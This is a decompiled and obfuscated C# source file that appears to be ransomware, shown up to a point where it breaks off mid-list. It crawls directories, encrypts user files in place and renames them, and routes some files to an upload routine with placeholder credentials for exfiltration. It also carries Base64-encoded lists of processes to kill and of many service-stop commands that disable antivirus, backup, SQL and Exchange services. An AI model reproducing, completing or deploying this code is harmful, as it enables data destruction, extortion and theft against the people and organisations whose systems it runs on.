using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using OYbMlLMDahZ;
using YqzZGTYuuk;

namespace oEqFtKwIikP;

internal class ieyWohRMXsyos
{
	public class VeQPTbSHeMYm
	{
		private static StringCollection EwGinGavQfdPhK = new StringCollection();

		private static List<string> gadEUxUAaWNA = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(tEHBqPAYINDcv("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("HOW_TO_DECYPHER_FILES") && !text.EndsWith(".locked") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(AAsNehQDcrriH))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(riXOsPCdks) * 1024.0 * 1024.0 && VsrAGOMgiir == "YES")
							{
								gadEUxUAaWNA.Add(text);
							}
							else if (File.Exists(text) && VsrAGOMgiir == "NO")
							{
								gadEUxUAaWNA.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return gadEUxUAaWNA;
		}
	}

	[CompilerGenerated]
	private sealed class MityJMakdmC
	{
		public string[] cPxDzIWkyaMAP;

		public void _003CMain_003Eb__7()
		{
			XdbgLnnHUFXLi.wLRBtzfOMJr(cPxDzIWkyaMAP);
		}
	}

	[CompilerGenerated]
	private sealed class cIDnGQMbNkXsUY
	{
		public string[] hwqZFgICNsa;

		public string[] LQvMLrkdQiqOa;

		public string SntRQGwoCsCcw;

		public string CGybFCjousJxNm;
	}

	[CompilerGenerated]
	private sealed class qclmxtZbcPYgf
	{
		public cIDnGQMbNkXsUY WzQiRtmwYKwNCrwuq;

		public string UVyMrEbSrOfR;

		public void _003CCrypt_003Eb__13()
		{
			CuAcRbuRieM(UVyMrEbSrOfR, WzQiRtmwYKwNCrwuq.hwqZFgICNsa, WzQiRtmwYKwNCrwuq.CGybFCjousJxNm, WzQiRtmwYKwNCrwuq.LQvMLrkdQiqOa, WzQiRtmwYKwNCrwuq.SntRQGwoCsCcw);
		}
	}

	[CompilerGenerated]
	private sealed class qcBNfAJeNR
	{
		public List<string> TAERpmtDAObfY;

		public List<string> kNBtWMVuBAVVZF;

		public string dNMZRZaDxxlrr;

		public string[] xBwRXqDeANA;

		public string WrmiVjDyracfcM;

		public void _003CWorkerCrypter2_003Eb__1c(string t1)
		{
			foreach (string item in kNBtWMVuBAVVZF)
			{
				if (xBwRXqDeANA.Length != 0)
				{
					string[] array = xBwRXqDeANA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						string text = item.ToLower();
						if (!text.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0336;
					}
				}
				if (AyaMUSvKASQrXwE == "NO")
				{
					string text2 = item.ToLower();
					if (!text2.EndsWith(t1))
					{
						continue;
					}
				}
				if (lcwZgHzgRvhoMz.Contains(item))
				{
					continue;
				}
				if (FSkrrCQAIpuB == "YES")
				{
					try
					{
						if (jmBcImfTEkDAKE.xPOFMJanBPGOSC(item))
						{
							jmBcImfTEkDAKE.DxWOrEkBWxMLn(item);
						}
					}
					catch
					{
					}
				}
				lcwZgHzgRvhoMz.Add(item);
				if (!xNfCQSzUMjqNUFLU.Contains(Path.GetDirectoryName(item)))
				{
					xNfCQSzUMjqNUFLU.Add(Path.GetDirectoryName(item));
				}
				ZZghHyGGSZepA(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception)
					{
						goto end_IL_00e8;
					}
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (BJRJMRvLJvUy == "YES" && fileStream.Length > Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024 && !TAERpmtDAObfY.Contains(t1))
					{
						if (dZaLbHeSffOykBlbqT == "YES")
						{
							foreach (string item2 in ptwMCNORHSBSo)
							{
								if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "YES")
								{
									if (Convert.ToInt32(ZaYuJzCvuUhm) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vexuMasAzwGi == "NO")
								{
									try
									{
										ccEPHgfBCGDXR.ocQfPPuxiOJiT("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] array2 = null;
						byte[] array3 = WKTrUcDvdshUI.SYFaRhrUKFjplK(item, Convert.ToInt32(xUhpmBbRMOnPvOyQY) * 1024 * 1024);
						array2 = (qDwCLcYLcoNWFI ? oKIHSxCMzfhfpfvg.VrHhCfQdmwyaCt(array3, Encoding.ASCII.GetBytes(WrmiVjDyracfcM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WKTrUcDvdshUI.nJFhMsmRXfyvJ(array3, Encoding.ASCII.GetBytes(WrmiVjDyracfcM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
						WKTrUcDvdshUI.FjemdWpOHZlReLE(item, array2);
						if (dNMZRZaDxxlrr != ".*")
						{
							File.Move(item, item + dNMZRZaDxxlrr);
						}
					}
					else if (dNMZRZaDxxlrr != ".*")
					{
						ZsMLFDBDzuAH(item, item + dNMZRZaDxxlrr, sFcjbqQpCeL);
					}
					else
					{
						ZsMLFDBDzuAH(item, item + ".part", sFcjbqQpCeL);
					}
					end_IL_00e8:;
				}
				catch (Exception)
				{
				}
				IL_0336:;
			}
		}
	}

	[CompilerGenerated]
	private sealed class FaVJhEyIgsv
	{
		public string mlYjvKGmaVSHy;

		public string ztAYZXlVdFF;

		public void _003CEncrypt2_003Eb__1f()
		{
			while (true)
			{
				try
				{
					File.Delete(mlYjvKGmaVSHy);
					break;
				}
				catch
				{
				}
			}
		}

		public void _003CEncrypt2_003Eb__20()
		{
			while (true)
			{
				try
				{
					if (File.Exists(ztAYZXlVdFF))
					{
						File.Delete(ztAYZXlVdFF);
					}
					break;
				}
				catch
				{
				}
			}
		}
	}

	public static string EcLYLrJYMXynSJF = "EVET";

	public static string[] fhDZlvNOTMsqO;

	public static IEnumerable<DirectoryInfo> XZpLKWBSdYK;

	public static byte[] sFcjbqQpCeL = null;

	public static DirectoryInfo wmFeLbewxU;

	public static string VsrAGOMgiir = "NO";

	public static string riXOsPCdks = "100000000";

	public static List<string> GrDdmoqpEPCpU = new List<string>();

	public static List<string> XJLmxpojkjy = new List<string>();

	public static string HWSgeZuYPZLOPAG = "NO";

	public static string WrmiVjDyracfcM = "";

	public static string INBmIMSAfdxyP = "NO";

	public static int RYkOOzVuUrgx = 0;

	public static string FSkrrCQAIpuB = "NO";

	public static string mYqFUigNLAz = "NO";

	public static string zIsZFJMYVYryA = "NO";

	public static string ffJKPbiimQKJed = "0";

	public static string EKANxbdPUupX = "YES";

	public static string DIMictQiLm = "NO";

	public static string TuvyUxGYwBHGK = "NO";

	public static string MkccPpSJaMnKAD = "NO";

	public static List<string> EnhGvnHJKfwXzvmZ = new List<string>
	{
		tEHBqPAYINDcv("bHNhc3MuZXhl"),
		tEHBqPAYINDcv("c3ZjaHN0LmV4ZQ=="),
		tEHBqPAYINDcv("Y3Jjc3MuZXhl"),
		tEHBqPAYINDcv("Y2hyb21lMzIuZXhl"),
		tEHBqPAYINDcv("ZmlyZWZveC5leGU="),
		tEHBqPAYINDcv("Y2FsYy5leGU="),
		tEHBqPAYINDcv("bXlzcWxkLmV4ZQ=="),
		tEHBqPAYINDcv("ZGxsaHN0LmV4ZQ=="),
		tEHBqPAYINDcv("b3BlcmEzMi5leGU="),
		tEHBqPAYINDcv("bWVtb3AuZXhl"),
		tEHBqPAYINDcv("c3Bvb2xjdi5leGU="),
		tEHBqPAYINDcv("Y3RmbW9tLmV4ZQ=="),
		tEHBqPAYINDcv("U2t5cGVBcHAuZXhl")
	};

	public static List<string> xNfCQSzUMjqNUFLU = new List<string>();

	public static string BFiHBHjLVBCP = "YES";

	public static string tIpobfogipnBZgR = "NO";

	public static string DWfyKRRVOwkqG = "NO";

	public static List<string> lcwZgHzgRvhoMz = new List<string>();

	public static string TgxWuRriOF = "NO";

	private static string vkbtWVhByfBlP = "ad906410-d4c3-421f-b89f-6bf55393fa4c";

	public static string qjYyDXzYrwB = "YES";

	public static string EQpTjtwRmERwh = "NO";

	public static List<string> hIlxdLinSlxkY = new List<string>
	{
		tEHBqPAYINDcv("c3RvcCBhdnBzdXMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBtZmV3YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBEZWZXYXRjaCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBjY0V2dE1nciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBjY1NldE1nciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTYXZSb2FtIC95"),
		tEHBqPAYINDcv("c3RvcCBSVFZzY2FuIC95"),
		tEHBqPAYINDcv("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		tEHBqPAYINDcv("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBZb29CYWNrdXAgL3k="),
		tEHBqPAYINDcv("c3RvcCBZb29JVCAveQ=="),
		tEHBqPAYINDcv("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		tEHBqPAYINDcv("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		tEHBqPAYINDcv("c3RvcCBWU05BUFZTUyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCB2ZWVhbSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBBY3JTY2gyU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		tEHBqPAYINDcv("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBzb3Bob3MgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBJSVNBZG1pbiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBTYW1TcyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBQT1AzU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTTVRQU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		tEHBqPAYINDcv("c3RvcCBTc3RwU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		tEHBqPAYINDcv("c3RvcCBVSTBEZXRlY3QgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBXM1N2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBNU09MQVAkVFBTIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBBY3JTY2gyU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		tEHBqPAYINDcv("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		tEHBqPAYINDcv("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBBUlNNIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		tEHBqPAYINDcv("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		tEHBqPAYINDcv("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRQUk9EIC95"),
		tEHBqPAYINDcv("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		tEHBqPAYINDcv("c3RvcCBBbnRpdmlydXMgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		tEHBqPAYINDcv("c3RvcCBBVlAgL3k="),
		tEHBqPAYINDcv("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		tEHBqPAYINDcv("c3RvcCBEQ0FnZW50IC95"),
		tEHBqPAYINDcv("c3RvcCBiZWRiZyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBFaHR0cFNydiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNTVMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		tEHBqPAYINDcv("c3RvcCBla3JuIC95"),
		tEHBqPAYINDcv("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		tEHBqPAYINDcv("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRUUFMgL3k="),
		tEHBqPAYINDcv("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBudHJ0c2NhbiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		tEHBqPAYINDcv("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBFU0hBU1JWIC95"),
		tEHBqPAYINDcv("c3RvcCBTRFJTVkMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		tEHBqPAYINDcv("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		tEHBqPAYINDcv("c3RvcCBLQVZGUyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxXcml0ZXIgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBLQVZGU0dUIC95"),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBrYXZmc3NscCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		tEHBqPAYINDcv("c3RvcCBrbG5hZ2VudCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBtYWNtbnN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		tEHBqPAYINDcv("c3RvcCBtYXN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		tEHBqPAYINDcv("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		tEHBqPAYINDcv("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		tEHBqPAYINDcv("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		tEHBqPAYINDcv("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNeVNRTDU3IC95"),
		tEHBqPAYINDcv("c3RvcCBNY1NoaWVsZCAveQ=="),
		tEHBqPAYINDcv("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		tEHBqPAYINDcv("c3RvcCBNeVNRTDgwIC95"),
		tEHBqPAYINDcv("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		tEHBqPAYINDcv("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		tEHBqPAYINDcv("c3RvcCBtZmVmaXJlIC95"),
		tEHBqPAYINDcv("c3RvcCB3YmVuZ2luZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		tEHBqPAYINDcv("c3RvcCBtZmVtbXMgL3k="),
		tEHBqPAYINDcv("c3RvcCB3YmVuZ2luZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBSRVN2YyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBtZmV2dHAgL3k="),
		tEHBqPAYINDcv("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		tEHBqPAYINDcv("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		tEHBqPAYINDcv("c3RvcCBzYWNzdnIgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		tEHBqPAYINDcv("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		tEHBqPAYINDcv("c3RvcCBTQVZTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		tEHBqPAYINDcv("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		tEHBqPAYINDcv("c3RvcCBTaE1vbml0b3IgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		tEHBqPAYINDcv("c3RvcCBTbWNpbnN0IC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		tEHBqPAYINDcv("c3RvcCBTbWNTZXJ2aWNlIC95"),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		tEHBqPAYINDcv("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		tEHBqPAYINDcv("c3RvcCBzb3Bob3NzcHMgL3k="),
		tEHBqPAYINDcv("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
